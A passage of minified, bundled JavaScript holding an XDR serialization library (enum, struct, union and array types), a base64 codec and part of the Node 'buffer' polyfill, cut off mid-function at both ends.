                        static isValid(He) {
                            return typeof He == "number"
                        }
                    }
                    class ve extends he {
                        static read() {
                            throw new V("quadruple not supported")
                        }
                        static write() {
                            throw new V("quadruple not supported")
                        }
                        static isValid() {
                            return !1
                        }
                    }
                    class ge extends he {
                        static read(He) {
                            const ke = q.read(He);
                            switch (ke) {
                            case 0:
                                return !1;
                            case 1:
                                return !0;
                            default:
                                throw new F(`got ${ke} when trying to read a bool`)
                            }
                        }
                        static write(He, ke) {
                            const Me = He ? 1 : 0;
                            q.write(Me, ke)
                        }
                        static isValid(He) {
                            return typeof He == "boolean"
                        }
                    }
                    var Re = X(616).A;
                    class Pe extends pe {
                        constructor(He=de.MAX_VALUE) {
                            super(),
                            this._maxLength = He
                        }
                        read(He) {
                            const ke = de.read(He);
                            if (ke > this._maxLength)
                                throw new F(`saw ${ke} length String, max allowed is ${this._maxLength}`);
                            return He.read(ke)
                        }
                        readString(He) {
                            return this.read(He).toString("utf8")
                        }
                        write(He, ke) {
                            const Me = typeof He == "string" ? Re.byteLength(He, "utf8") : He.length;
                            if (Me > this._maxLength)
                                throw new Y(`got ${He.length} bytes, max allowed is ${this._maxLength}`);
                            de.write(Me, ke),
                            ke.write(He, Me)
                        }
                        isValid(He) {
                            return typeof He == "string" ? Re.byteLength(He, "utf8") <= this._maxLength : !!(He instanceof Array || Re.isBuffer(He)) && He.length <= this._maxLength
                        }
                    }
                    var Ie = X(616).A;
                    class Te extends pe {
                        constructor(He) {
                            super(),
                            this._length = He
                        }
                        read(He) {
                            return He.read(this._length)
                        }
                        write(He, ke) {
                            const {length: Me} = He;
                            if (Me !== this._length)
                                throw new Y(`got ${He.length} bytes, expected ${this._length}`);
                            ke.write(He, Me)
                        }
                        isValid(He) {
                            return Ie.isBuffer(He) && He.length === this._length
                        }
                    }
                    var Le = X(616).A;
                    class Ze extends pe {
                        constructor(He=de.MAX_VALUE) {
                            super(),
                            this._maxLength = He
                        }
                        read(He) {
                            const ke = de.read(He);
                            if (ke > this._maxLength)
                                throw new F(`saw ${ke} length VarOpaque, max allowed is ${this._maxLength}`);
                            return He.read(ke)
                        }
                        write(He, ke) {
                            const {length: Me} = He;
                            if (He.length > this._maxLength)
                                throw new Y(`got ${He.length} bytes, max allowed is ${this._maxLength}`);
                            de.write(Me, ke),
                            ke.write(He, Me)
                        }
                        isValid(He) {
                            return Le.isBuffer(He) && He.length <= this._maxLength
                        }
                    }
                    class $e extends pe {
                        constructor(He, ke) {
                            super(),
                            this._childType = He,
                            this._length = ke
                        }
                        read(He) {
                            const ke = new X.g.Array(this._length);
                            for (let Me = 0; Me < this._length; Me++)
                                ke[Me] = this._childType.read(He);
                            return ke
                        }
                        write(He, ke) {
                            if (!X.g.Array.isArray(He))
                                throw new Y("value is not array");
                            if (He.length !== this._length)
                                throw new Y(`got array of size ${He.length}, expected ${this._length}`);
                            for (const Me of He)
                                this._childType.write(Me, ke)
                        }
                        isValid(He) {
                            if (!(He instanceof X.g.Array) || He.length !== this._length)
                                return !1;
                            for (const ke of He)
                                if (!this._childType.isValid(ke))
                                    return !1;
                            return !0
                        }
                    }
                    class Ne extends pe {
                        constructor(He, ke=de.MAX_VALUE) {
                            super(),
                            this._childType = He,
                            this._maxLength = ke
                        }
                        read(He) {
                            const ke = de.read(He);
                            if (ke > this._maxLength)
                                throw new F(`saw ${ke} length VarArray, max allowed is ${this._maxLength}`);
                            const Me = new Array(ke);
                            for (let Ue = 0; Ue < ke; Ue++)
                                Me[Ue] = this._childType.read(He);
                            return Me
                        }
                        write(He, ke) {
                            if (!(He instanceof Array))
                                throw new Y("value is not array");
                            if (He.length > this._maxLength)
                                throw new Y(`got array of size ${He.length}, max allowed is ${this._maxLength}`);
                            de.write(He.length, ke);
                            for (const Me of He)
                                this._childType.write(Me, ke)
                        }
                        isValid(He) {
                            if (!(He instanceof Array) || He.length > this._maxLength)
                                return !1;
                            for (const ke of He)
                                if (!this._childType.isValid(ke))
                                    return !1;
                            return !0
                        }
                    }
                    class qe extends he {
                        constructor(He) {
                            super(),
                            this._childType = He
                        }
                        read(He) {
                            if (ge.read(He))
                                return this._childType.read(He)
                        }
                        write(He, ke) {
                            const Me = He != null;
                            ge.write(Me, ke),
                            Me && this._childType.write(He, ke)
                        }
                        isValid(He) {
                            return He == null || this._childType.isValid(He)
                        }
                    }
                    class Ve extends he {
                        static read() {}
                        static write(He) {
                            if (He !== void 0)
                                throw new Y("trying to write value to a void slot")
                        }
                        static isValid(He) {
                            return He === void 0
                        }
                    }
                    class lt extends he {
                        constructor(He, ke) {
                            super(),
                            this.name = He,
                            this.value = ke
                        }
                        static read(He) {
                            const ke = q.read(He)
                              , Me = this._byValue[ke];
                            if (Me === void 0)
                                throw new F(`unknown ${this.enumName} member for value ${ke}`);
                            return Me
                        }
                        static write(He, ke) {
                            if (!this.isValid(He))
                                throw new Y(`${He} has enum name ${He == null ? void 0 : He.enumName}, not ${this.enumName}: ${JSON.stringify(He)}`);
                            q.write(He.value, ke)
                        }
                        static isValid(He) {
                            var ke;
                            return ((ke = He == null ? void 0 : He.constructor) == null ? void 0 : ke.enumName) === this.enumName || Ae(He, this)
                        }
                        static members() {
                            return this._members
                        }
                        static values() {
                            return Object.values(this._members)
                        }
                        static fromName(He) {
                            const ke = this._members[He];
                            if (!ke)
                                throw new TypeError(`${He} is not a member of ${this.enumName}`);
                            return ke
                        }
                        static fromValue(He) {
                            const ke = this._byValue[He];
                            if (ke === void 0)
                                throw new TypeError(`${He} is not a value of any member of ${this.enumName}`);
                            return ke
                        }
                        static create(He, ke, Me) {
                            const Ue = class extends lt {
                            }
                            ;
                            Ue.enumName = ke,
                            He.results[ke] = Ue,
                            Ue._members = {},
                            Ue._byValue = {};
                            for (const [rt,dt] of Object.entries(Me)) {
                                const Et = new Ue(rt,dt);
                                Ue._members[rt] = Et,
                                Ue._byValue[dt] = Et,
                                Ue[rt] = () => Et
                            }
                            return Ue
                        }
                    }
                    class nt extends he {
                        resolve() {
                            throw new V('"resolve" method should be implemented in the descendant class')
                        }
                    }
                    class je extends pe {
                        constructor(He) {
                            super(),
                            this._attributes = He || {}
                        }
                        static read(He) {
                            const ke = {};
                            for (const [Me,Ue] of this._fields)
                                ke[Me] = Ue.read(He);
                            return new this(ke)
                        }
                        static write(He, ke) {
                            var Me;
                            if (!this.isValid(He))
                                throw new Y(`${He} has struct name ${(Me = He == null ? void 0 : He.constructor) == null ? void 0 : Me.structName}, not ${this.structName}: ${JSON.stringify(He)}`);
                            for (const [Ue,rt] of this._fields) {
                                const dt = He._attributes[Ue];
                                rt.write(dt, ke)
                            }
                        }
                        static isValid(He) {
                            var ke;
                            return ((ke = He == null ? void 0 : He.constructor) == null ? void 0 : ke.structName) === this.structName || Ae(He, this)
                        }
                        static create(He, ke, Me) {
                            const Ue = class extends je {
                            }
                            ;
                            Ue.structName = ke,
                            He.results[ke] = Ue;
                            const rt = new Array(Me.length);
                            for (let dt = 0; dt < Me.length; dt++) {
                                const Et = Me[dt]
                                  , ft = Et[0];
                                let gt = Et[1];
                                gt instanceof nt && (gt = gt.resolve(He)),
                                rt[dt] = [ft, gt],
                                Ue.prototype[ft] = Ke(ft)
                            }
                            return Ue._fields = rt,
                            Ue
                        }
                    }
                    function Ke(tt) {
                        return function(He) {
                            return He !== void 0 && (this._attributes[tt] = He),
                            this._attributes[tt]
                        }
                    }
                    class Qe extends pe {
                        constructor(He, ke) {
                            super(),
                            this.set(He, ke)
                        }
                        set(He, ke) {
                            typeof He == "string" && (He = this.constructor._switchOn.fromName(He)),
                            this._switch = He;
                            const Me = this.constructor.armForSwitch(this._switch);
                            this._arm = Me,
                            this._armType = Me === Ve ? Ve : this.constructor._arms[Me],
                            this._value = ke
                        }
                        get(He=this._arm) {
                            if (this._arm !== Ve && this._arm !== He)
                                throw new TypeError(`${He} not set`);
                            return this._value
                        }
                        switch() {
                            return this._switch
                        }
                        arm() {
                            return this._arm
                        }
                        armType() {
                            return this._armType
                        }
                        value() {
                            return this._value
                        }
                        static armForSwitch(He) {
                            const ke = this._switches.get(He);
                            if (ke !== void 0)
                                return ke;
                            if (this._defaultArm)
                                return this._defaultArm;
                            throw new TypeError(`Bad union switch: ${He}`)
                        }
                        static armTypeForArm(He) {
                            return He === Ve ? Ve : this._arms[He]
                        }
                        static read(He) {
                            const ke = this._switchOn.read(He)
                              , Me = this.armForSwitch(ke)
                              , Ue = Me === Ve ? Ve : this._arms[Me];
                            let rt;
                            return rt = Ue !== void 0 ? Ue.read(He) : Me.read(He),
                            new this(ke,rt)
                        }
                        static write(He, ke) {
                            if (!this.isValid(He))
                                throw new Y(`${He} has union name ${He == null ? void 0 : He.unionName}, not ${this.unionName}: ${JSON.stringify(He)}`);
                            this._switchOn.write(He.switch(), ke),
                            He.armType().write(He.value(), ke)
                        }
                        static isValid(He) {
                            var ke;
                            return ((ke = He == null ? void 0 : He.constructor) == null ? void 0 : ke.unionName) === this.unionName || Ae(He, this)
                        }
                        static create(He, ke, Me) {
                            const Ue = class extends Qe {
                            }
                            ;
                            Ue.unionName = ke,
                            He.results[ke] = Ue,
                            Me.switchOn instanceof nt ? Ue._switchOn = Me.switchOn.resolve(He) : Ue._switchOn = Me.switchOn,
                            Ue._switches = new Map,
                            Ue._arms = {};
                            let rt = Me.defaultArm;
                            rt instanceof nt && (rt = rt.resolve(He)),
                            Ue._defaultArm = rt;
                            for (const [dt,Et] of Me.switches) {
                                const ft = typeof dt == "string" ? Ue._switchOn.fromName(dt) : dt;
                                Ue._switches.set(ft, Et)
                            }
                            if (Ue._switchOn.values !== void 0)
                                for (const dt of Ue._switchOn.values())
                                    Ue[dt.name] = function(Et) {
                                        return new Ue(dt,Et)
                                    }
                                    ,
                                    Ue.prototype[dt.name] = function(Et) {
                                        return this.set(dt, Et)
                                    }
                                    ;
                            if (Me.arms)
                                for (const [dt,Et] of Object.entries(Me.arms))
                                    Ue._arms[dt] = Et instanceof nt ? Et.resolve(He) : Et,
                                    Et !== Ve && (Ue.prototype[dt] = function() {
                                        return this.get(dt)
                                    }
                                    );
                            return Ue
                        }
                    }
                    class We extends nt {
                        constructor(He) {
                            super(),
                            this.name = He
                        }
                        resolve(He) {
                            return He.definitions[this.name].resolve(He)
                        }
                    }
                    class mt extends nt {
                        constructor(He, ke, Me=!1) {
                            super(),
                            this.childReference = He,
                            this.length = ke,
                            this.variable = Me
                        }
                        resolve(He) {
                            let ke = this.childReference
                              , Me = this.length;
                            return ke instanceof nt && (ke = ke.resolve(He)),
                            Me instanceof nt && (Me = Me.resolve(He)),
                            this.variable ? new Ne(ke,Me) : new $e(ke,Me)
                        }
                    }
                    class ct extends nt {
                        constructor(He) {
                            super(),
                            this.childReference = He,
                            this.name = He.name
                        }
                        resolve(He) {
                            let ke = this.childReference;
                            return ke instanceof nt && (ke = ke.resolve(He)),
                            new qe(ke)
                        }
                    }
                    class vt extends nt {
                        constructor(He, ke) {
                            super(),
                            this.sizedType = He,
                            this.length = ke
                        }
                        resolve(He) {
                            let ke = this.length;
                            return ke instanceof nt && (ke = ke.resolve(He)),
                            new this.sizedType(ke)
                        }
                    }
                    class we {
                        constructor(He, ke, Me) {
                            this.constructor = He,
                            this.name = ke,
                            this.config = Me
                        }
                        resolve(He) {
                            return this.name in He.results ? He.results[this.name] : this.constructor(He, this.name, this.config)
                        }
                    }
                    function _e(tt, He, ke) {
                        return ke instanceof nt && (ke = ke.resolve(tt)),
                        tt.results[He] = ke,
                        ke
                    }
                    function Ce(tt, He, ke) {
                        return tt.results[He] = ke,
                        ke
                    }
                    class st {
                        constructor(He) {
                            this._destination = He,
                            this._definitions = {}
                        }
                        enum(He, ke) {
                            const Me = new we(lt.create,He,ke);
                            this.define(He, Me)
                        }
                        struct(He, ke) {
                            const Me = new we(je.create,He,ke);
                            this.define(He, Me)
                        }
                        union(He, ke) {
                            const Me = new we(Qe.create,He,ke);
                            this.define(He, Me)
                        }
                        typedef(He, ke) {
                            const Me = new we(_e,He,ke);
                            this.define(He, Me)
                        }
                        const(He, ke) {
                            const Me = new we(Ce,He,ke);
                            this.define(He, Me)
                        }
                        void() {
                            return Ve
                        }
                        bool() {
                            return ge
                        }
                        int() {
                            return q
                        }
                        hyper() {
                            return te
                        }
                        uint() {
                            return de
                        }
                        uhyper() {
                            return re
                        }
                        float() {
                            return $
                        }
                        double() {
                            return ie
                        }
                        quadruple() {
                            return ve
                        }
                        string(He) {
                            return new vt(Pe,He)
                        }
                        opaque(He) {
                            return new vt(Te,He)
                        }
                        varOpaque(He) {
                            return new vt(Ze,He)
                        }
                        array(He, ke) {
                            return new mt(He,ke)
                        }
                        varArray(He, ke) {
                            return new mt(He,ke,!0)
                        }
                        option(He) {
                            return new ct(He)
                        }
                        define(He, ke) {
                            if (this._destination[He] !== void 0)
                                throw new V(`${He} is already defined`);
                            this._definitions[He] = ke
                        }
                        lookup(He) {
                            return new We(He)
                        }
                        resolve() {
                            for (const He of Object.values(this._definitions))
                                He.resolve({
                                    definitions: this._definitions,
                                    results: this._destination
                                })
                        }
                    }
                    function et(tt, He={}) {
                        if (tt) {
                            const ke = new st(He);
                            tt(ke),
                            ke.resolve()
                        }
                        return He
                    }
                }
                ,
                526: (w, b) => {
                    b.byteLength = function(ae) {
                        var ne = Q(ae)
                          , oe = ne[0]
                          , ue = ne[1];
                        return 3 * (oe + ue) / 4 - ue
                    }
                    ,
                    b.toByteArray = function(ae) {
                        var ne, oe, ue = Q(ae), fe = ue[0], he = ue[1], pe = new F(function(xe, Ae, Ee) {
                            return 3 * (Ae + Ee) / 4 - Ee
                        }(0, fe, he)), ye = 0, be = he > 0 ? fe - 4 : fe;
                        for (oe = 0; oe < be; oe += 4)
                            ne = Y[ae.charCodeAt(oe)] << 18 | Y[ae.charCodeAt(oe + 1)] << 12 | Y[ae.charCodeAt(oe + 2)] << 6 | Y[ae.charCodeAt(oe + 3)],
                            pe[ye++] = ne >> 16 & 255,
                            pe[ye++] = ne >> 8 & 255,
                            pe[ye++] = 255 & ne;
                        return he === 2 && (ne = Y[ae.charCodeAt(oe)] << 2 | Y[ae.charCodeAt(oe + 1)] >> 4,
                        pe[ye++] = 255 & ne),
                        he === 1 && (ne = Y[ae.charCodeAt(oe)] << 10 | Y[ae.charCodeAt(oe + 1)] << 4 | Y[ae.charCodeAt(oe + 2)] >> 2,
                        pe[ye++] = ne >> 8 & 255,
                        pe[ye++] = 255 & ne),
                        pe
                    }
                    ,
                    b.fromByteArray = function(ae) {
                        for (var ne, oe = ae.length, ue = oe % 3, fe = [], he = 16383, pe = 0, ye = oe - ue; pe < ye; pe += he)
                            fe.push(ee(ae, pe, pe + he > ye ? ye : pe + he));
                        return ue === 1 ? (ne = ae[oe - 1],
                        fe.push(X[ne >> 2] + X[ne << 4 & 63] + "==")) : ue === 2 && (ne = (ae[oe - 2] << 8) + ae[oe - 1],
                        fe.push(X[ne >> 10] + X[ne >> 4 & 63] + X[ne << 2 & 63] + "=")),
                        fe.join("")
                    }
                    ;
                    for (var X = [], Y = [], F = typeof Uint8Array < "u" ? Uint8Array : Array, V = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", K = 0; K < 64; ++K)
                        X[K] = V[K],
                        Y[V.charCodeAt(K)] = K;
                    function Q(ae) {
                        var ne = ae.length;
                        if (ne % 4 > 0)
                            throw new Error("Invalid string. Length must be a multiple of 4");
                        var oe = ae.indexOf("=");
                        return oe === -1 && (oe = ne),
                        [oe, oe === ne ? 0 : 4 - oe % 4]
                    }
                    function ee(ae, ne, oe) {
                        for (var ue, fe, he = [], pe = ne; pe < oe; pe += 3)
                            ue = (ae[pe] << 16 & 16711680) + (ae[pe + 1] << 8 & 65280) + (255 & ae[pe + 2]),
                            he.push(X[(fe = ue) >> 18 & 63] + X[fe >> 12 & 63] + X[fe >> 6 & 63] + X[63 & fe]);
                        return he.join("")
                    }
                    Y[45] = 62,
                    Y[95] = 63
                }
                ,
                287: (w, b, X) => {
                    const Y = X(526)
                      , F = X(251)
                      , V = typeof Symbol == "function" && typeof Symbol.for == "function" ? Symbol.for("nodejs.util.inspect.custom") : null;
                    b.hp = ee,
                    b.IS = 50;
                    const K = 2147483647;
                    function Q(we) {
                        if (we > K)
                            throw new RangeError('The value "' + we + '" is invalid for option "size"');
                        const _e = new Uint8Array(we);
                        return Object.setPrototypeOf(_e, ee.prototype),
                        _e
                    }
                    function ee(we, _e, Ce) {
                        if (typeof we == "number") {
                            if (typeof _e == "string")
                                throw new TypeError('The "string" argument must be of type string. Received type number');
                            return oe(we)
                        }
                        return ae(we, _e, Ce)
                    }
                    function ae(we, _e, Ce) {
                        if (typeof we == "string")
                            return function(tt, He) {
                                if (typeof He == "string" && He !== "" || (He = "utf8"),
                                !ee.isEncoding(He))
                                    throw new TypeError("Unknown encoding: " + He);
                                const ke = 0 | pe(tt, He);
                                let Me = Q(ke);
                                const Ue = Me.write(tt, He);
                                return Ue !== ke && (Me = Me.slice(0, Ue)),
                                Me
                            }(we, _e);
                        if (ArrayBuffer.isView(we))
                            return function(tt) {
                                if (Qe(tt, Uint8Array)) {
                                    const He = new Uint8Array(tt);
                                    return fe(He.buffer, He.byteOffset, He.byteLength)
                                }
                                return ue(tt)
                            }(we);
                        if (we == null)
                            throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof we);
                        if (Qe(we, ArrayBuffer) || we && Qe(we.buffer, ArrayBuffer) || typeof SharedArrayBuffer < "u" && (Qe(we, SharedArrayBuffer) || we && Qe(we.buffer, SharedArrayBuffer)))
                            return fe(we, _e, Ce);
                        if (typeof we == "number")
                            throw new TypeError('The "value" argument must not be of type number. Received type number');
                        const st = we.valueOf && we.valueOf();
                        if (st != null && st !== we)
                            return ee.from(st, _e, Ce);
                        const et = function(tt) {
                            if (ee.isBuffer(tt)) {
                                const He = 0 | he(tt.length)
                                  , ke = Q(He);
                                return ke.length === 0 || tt.copy(ke, 0, 0, He),
                                ke
                            }
                            if (tt.length !== void 0)
                                return typeof tt.length != "number" || We(tt.length) ? Q(0) : ue(tt);
                            if (tt.type === "Buffer" && Array.isArray(tt.data))
                                return ue(tt.data)
                        }(we);
                        if (et)
                            return et;
                        if (typeof Symbol < "u" && Symbol.toPrimitive != null && typeof we[Symbol.toPrimitive] == "function")
                            return ee.from(we[Symbol.toPrimitive]("string"), _e, Ce);
                        throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof we)
                    }
                    function ne(we) {
                        if (typeof we != "number")
                            throw new TypeError('"size" argument must be of type number');
                        if (we < 0)
                            throw new RangeError('The value "' + we + '" is invalid for option "size"')
                    }
                    function oe(we) {
                        return ne(we),
                        Q(we < 0 ? 0 : 0 | he(we))
                    }
                    function ue(we) {
                        const _e = we.length < 0 ? 0 : 0 | he(we.length)
                          , Ce = Q(_e);
                        for (let st = 0; st < _e; st += 1)
                            Ce[st] = 255 & we[st];
                        return Ce
                    }
                    function fe(we, _e, Ce) {
                        if (_e < 0 || we.byteLength < _e)
                            throw new RangeError('"offset" is outside of buffer bounds');
                        if (we.byteLength < _e + (Ce || 0))
                            throw new RangeError('"length" is outside of buffer bounds');
                        let st;
                        return st = _e === void 0 && Ce === void 0 ? new Uint8Array(we) : Ce === void 0 ? new Uint8Array(we,_e) : new Uint8Array(we,_e,Ce),
                        Object.setPrototypeOf(st, ee.prototype),
                        st
                    }
                    function he(we) {
                        if (we >= K)
                            throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + K.toString(16) + " bytes");
                        return 0 | we
                    }
                    function pe(we, _e) {
                        if (ee.isBuffer(we))
                            return we.length;
                        if (ArrayBuffer.isView(we) || Qe(we, ArrayBuffer))
                            return we.byteLength;
                        if (typeof we != "string")
                            throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof we);
                        const Ce = we.length
                          , st = arguments.length > 2 && arguments[2] === !0;
                        if (!st && Ce === 0)
                            return 0;
                        let et = !1;
                        for (; ; )
                            switch (_e) {
                            case "ascii":
                            case "latin1":
                            case "binary":
                                return Ce;
                            case "utf8":
                            case "utf-8":
                                return nt(we).length;
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return 2 * Ce;
                            case "hex":
                                return Ce >>> 1;
                            case "base64":
                                return je(we).length;
                            default:
                                if (et)
                                    return st ? -1 : nt(we).length;
                                _e = ("" + _e).toLowerCase(),
                                et = !0
                            }
                    }
                    function ye(we, _e, Ce) {
                        let st = !1;
                        if ((_e === void 0 || _e < 0) && (_e = 0),
                        _e > this.length || ((Ce === void 0 || Ce > this.length) && (Ce = this.length),
                        Ce <= 0) || (Ce >>>= 0) <= (_e >>>= 0))
                            return "";
                        for (we || (we = "utf8"); ; )
                            switch (we) {
                            case "hex":
                                return re(this, _e, Ce);
                            case "utf8":
                            case "utf-8":
                                return Z(this, _e, Ce);
                            case "ascii":
                                return se(this, _e, Ce);
                            case "latin1":
                            case "binary":
                                return de(this, _e, Ce);
                            case "base64":
                                return U(this, _e, Ce);
                            case "ucs2":
                            case "ucs-2":
                            case "utf16le":
                            case "utf-16le":
                                return $(this, _e, Ce);
                            default:
                                if (st)
                                    throw new TypeError("Unknown encoding: " + we);
                                we = (we + "").toLowerCase(),
                                st = !0
                            }
                    }
                    function be(we, _e, Ce) {
                        const st = we[_e];
                        we[_e] = we[Ce],
                        we[Ce] = st
                    }
                    function xe(we, _e, Ce, st, et) {
                        if (we.length === 0)
                            return -1;
                        if (typeof Ce == "string" ? (st = Ce,
                        Ce = 0) : Ce > 2147483647 ? Ce = 2147483647 : Ce < -2147483648 && (Ce = -2147483648),
                        We(Ce = +Ce) && (Ce = et ? 0 : we.length - 1),
                        Ce < 0 && (Ce = we.length + Ce),
                        Ce >= we.length) {
                            if (et)
                                return -1;
                            Ce = we.length - 1
                        } else if (Ce < 0) {
                            if (!et)
                                return -1;
                            Ce = 0
                        }
                        if (typeof _e == "string" && (_e = ee.from(_e, st)),
                        ee.isBuffer(_e))
                            return _e.length === 0 ? -1 : Ae(we, _e, Ce, st, et);
                        if (typeof _e == "number")
                            return _e &= 255,
                            typeof Uint8Array.prototype.indexOf == "function" ? et ? Uint8Array.prototype.indexOf.call(we, _e, Ce) : Uint8Array.prototype.lastIndexOf.call(we, _e, Ce) : Ae(we, [_e], Ce, st, et);
                        throw new TypeError("val must be string, number or Buffer")
                    }
                    function Ae(we, _e, Ce, st, et) {
                        let tt, He = 1, ke = we.length, Me = _e.length;
                        if (st !== void 0 && ((st = String(st).toLowerCase()) === "ucs2" || st === "ucs-2" || st === "utf16le" || st === "utf-16le")) {
                            if (we.length < 2 || _e.length < 2)
                                return -1;
                            He = 2,
                            ke /= 2,
                            Me /= 2,
                            Ce /= 2
                        }
                        function Ue(rt, dt) {
                            return He === 1 ? rt[dt] : rt.readUInt16BE(dt * He)
                        }
                        if (et) {
                            let rt = -1;
                            for (tt = Ce; tt < ke; tt++)
                                if (Ue(we, tt) === Ue(_e, rt === -1 ? 0 : tt - rt)) {
                                    if (rt === -1 && (rt = tt),
                                    tt - rt + 1 === Me)
                                        return rt * He
                                } else
                                    rt !== -1 && (tt -= tt - rt),
                                    rt = -1
                        } else
                            for (Ce + Me > ke && (Ce = ke - Me),
                            tt = Ce; tt >= 0; tt--) {
                                let rt = !0;
                                for (let dt = 0; dt < Me; dt++)
                                    if (Ue(we, tt + dt) !== Ue(_e, dt)) {
                                        rt = !1;
                                        break
                                    }
                                if (rt)
                                    return tt
                            }
                        return -1
                    }
                    function Ee(we, _e, Ce, st) {
                        Ce = Number(Ce) || 0;
                        const et = we.length - Ce;
                        st ? (st = Number(st)) > et && (st = et) : st = et;
                        const tt = _e.length;
                        let He;
                        for (st > tt / 2 && (st = tt / 2),
                        He = 0; He < st; ++He) {
                            const ke = parseInt(_e.substr(2 * He, 2), 16);
                            if (We(ke))
                                return He;
                            we[Ce + He] = ke
                        }
                        return He
                    }
                    function Be(we, _e, Ce, st) {
                        return Ke(nt(_e, we.length - Ce), we, Ce, st)
                    }
                    function ce(we, _e, Ce, st) {
                        return Ke(function(et) {
                            const tt = [];
                            for (let He = 0; He < et.length; ++He)
                                tt.push(255 & et.charCodeAt(He));
                            return tt
                        }(_e), we, Ce, st)
                    }
                    function q(we, _e, Ce, st) {
                        return Ke(je(_e), we, Ce, st)
                    }
                    function L(we, _e, Ce, st) {
                        return Ke(function(et, tt) {
                            let He, ke, Me;
                            const Ue = [];
                            for (let rt = 0; rt < et.length && !((tt -= 2) < 0); ++rt)
                                He = et.charCodeAt(rt),
                                ke = He >> 8,
                                Me = He % 256,
                                Ue.push(Me),
                                Ue.push(ke);
                            return Ue
                        }(_e, we.length - Ce), we, Ce, st)
                    }
                    function U(we, _e, Ce) {
                        return _e === 0 && Ce === we.length ? Y.fromByteArray(we) : Y.fromByteArray(we.slice(_e, Ce))
                    }
                    function Z(we, _e, Ce) {
                        Ce = Math.min(we.length, Ce);
                        const st = [];
                        let et = _e;
                        for (; et < Ce; ) {
                            const tt = we[et];
                            let He = null
                              , ke = tt > 239 ? 4 : tt > 223 ? 3 : tt > 191 ? 2 : 1;
                            if (et + ke <= Ce) {
                                let Me, Ue, rt, dt;
                                switch (ke) {
                                case 1:
                                    tt < 128 && (He = tt);
                                    break;
                                case 2:
                                    Me = we[et + 1],
                                    (192 & Me) == 128 && (dt = (31 & tt) << 6 | 63 & Me,
                                    dt > 127 && (He = dt));
                                    break;
                                case 3:
                                    Me = we[et + 1],
                                    Ue = we[et + 2],
                                    (192 & Me) == 128 && (192 & Ue) == 128 && (dt = (15 & tt) << 12 | (63 & Me) << 6 | 63 & Ue,
                                    dt > 2047 && (dt < 55296 || dt > 57343) && (He = dt));
                                    break;
                                case 4:
                                    Me = we[et + 1],
                                    Ue = we[et + 2],
                                    rt = we[et + 3],
                                    (192 & Me) == 128 && (192 & Ue) == 128 && (192 & rt) == 128 && (dt = (15 & tt) << 18 | (63 & Me) << 12 | (63 & Ue) << 6 | 63 & rt,
                                    dt > 65535 && dt < 1114112 && (He = dt))
                                }
                            }
                            He === null ? (He = 65533,
                            ke = 1) : He > 65535 && (He -= 65536,
                            st.push(He >>> 10 & 1023 | 55296),
                            He = 56320 | 1023 & He),
                            st.push(He),
                            et += ke
                        }
                        return function(tt) {
                            const He = tt.length;
                            if (He <= te)
                                return String.fromCharCode.apply(String, tt);
                            let ke = ""
                              , Me = 0;
                            for (; Me < He; )
                                ke += String.fromCharCode.apply(String, tt.slice(Me, Me += te));
                            return ke
                        }(st)
                    }
                    ee.TYPED_ARRAY_SUPPORT = function() {
                        try {
                            const we = new Uint8Array(1)
                              , _e = {
                                foo: function() {
                                    return 42
                                }
                            };
                            return Object.setPrototypeOf(_e, Uint8Array.prototype),
                            Object.setPrototypeOf(we, _e),
                            we.foo() === 42
                        } catch {
                            return !1
                        }
                    }(),
                    ee.TYPED_ARRAY_SUPPORT || typeof console > "u" || typeof console.error != "function" || console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),
                    Object.defineProperty(ee.prototype, "parent", {
                        enumerable: !0,
                        get: function() {
                            if (ee.isBuffer(this))
                                return this.buffer
                        }
                    }),
                    Object.defineProperty(ee.prototype, "offset", {
                        enumerable: !0,
                        get: function() {
                            if (ee.isBuffer(this))
                                return this.byteOffset
                        }
                    }),
                    ee.poolSize = 8192,
                    ee.from = function(we, _e, Ce) {
                        return ae(we, _e, Ce)
                    }
                    ,
                    Object.setPrototypeOf(ee.prototype, Uint8Array.prototype),
                    Object.setPrototypeOf(ee, Uint8Array),
                    ee.alloc = function(we, _e, Ce) {
                        return function(st, et, tt) {
                            return ne(st),
                            st <= 0 ? Q(st) : et !== void 0 ? typeof tt == "string" ? Q(st).fill(et, tt) : Q(st).fill(et) : Q(st)
                        }(we, _e, Ce)
                    }
                    ,
                    ee.allocUnsafe = function(we) {
                        return oe(we)
                    }
                    ,
                    ee.allocUnsafeSlow = function(we) {
                        return oe(we)
                    }
                    ,
                    ee.isBuffer = function(we) {
                        return we != null && we._isBuffer === !0 && we !== ee.prototype
                    }
                    ,
                    ee.compare = function(we, _e) {
                        if (Qe(we, Uint8Array) && (we = ee.from(we, we.offset, we.byteLength)),
                        Qe(_e, Uint8Array) && (_e = ee.from(_e, _e.offset, _e.byteLength)),
                        !ee.isBuffer(we) || !ee.isBuffer(_e))
                            throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
                        if (we === _e)
                            return 0;
                        let Ce = we.length
                          , st = _e.length;
                        for (let et = 0, tt = Math.min(Ce, st); et < tt; ++et)
                            if (we[et] !== _e[et]) {
                                Ce = we[et],
                                st = _e[et];
                                break
                            }
                        return Ce < st ? -1 : st < Ce ? 1 : 0
                    }
                    ,
                    ee.isEncoding = function(we) {
                        switch (String(we).toLowerCase()) {
                        case "hex":
                        case "utf8":
                        case "utf-8":
                        case "ascii":
                        case "latin1":
                        case "binary":
                        case "base64":
                        case "ucs2":
                        case "ucs-2":
                        case "utf16le":
                        case "utf-16le":
                            return !0;
                        default:
                            return !1
                        }
                    }
                    ,
                    ee.concat = function(we, _e) {
                        if (!Array.isArray(we))
                            throw new TypeError('"list" argument must be an Array of Buffers');
                        if (we.length === 0)
                            return ee.alloc(0);
                        let Ce;
                        if (_e === void 0)
                            for (_e = 0,
                            Ce = 0; Ce < we.length; ++Ce)
                                _e += we[Ce].length;
                        const st = ee.allocUnsafe(_e);
                        let et = 0;
                        for (Ce = 0; Ce < we.length; ++Ce) {
                            let tt = we[Ce];
                            if (Qe(tt, Uint8Array))
